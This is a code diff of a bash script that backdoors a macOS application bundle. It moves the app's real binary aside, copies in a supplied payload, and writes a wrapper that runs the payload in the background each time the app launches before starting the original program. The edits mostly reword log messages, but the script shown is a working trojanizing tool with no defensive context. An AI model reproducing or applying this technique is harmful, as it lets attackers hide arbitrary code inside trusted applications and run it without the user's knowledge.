@@ -35,19 +35,18 @@ logloc "Payload" "$payload"
 logloc "App root" "$app_root"
 logloc "Info.plist" "$info"
 logloc "MacOS directory" "$macos"
-logloc "Binary" "$binary"
+logloc "Original binary" "$binary"
 
 if [[ -f "${binary}_og" ]]; then
-    warn "Replacing existing hidden script."
+    warn "Replacing existing payload."
 else
-    log "Moving normal binary"
+    log "Moving original binary"
     mv "$binary" "${binary}_og"
 fi
 log "Inserting payload"
 cp "$payload" "${binary}_pl"
-log "Making payload executable"
 
-log "Creating master"
+log "Creating master script"
 cat > "$binary" <<'EOF'
 #!/usr/bin/env bash
 
@@ -56,6 +55,7 @@ binary="$(dirname "${BASH_SOURCE[0]}")/$(basename "$0")"
 "${binary}_pl" &
 "${binary}_og"
 EOF
+log "Making master script and payload executable"
 chmod +x "${binary}_pl" "$binary"
 
 succ "Success!"
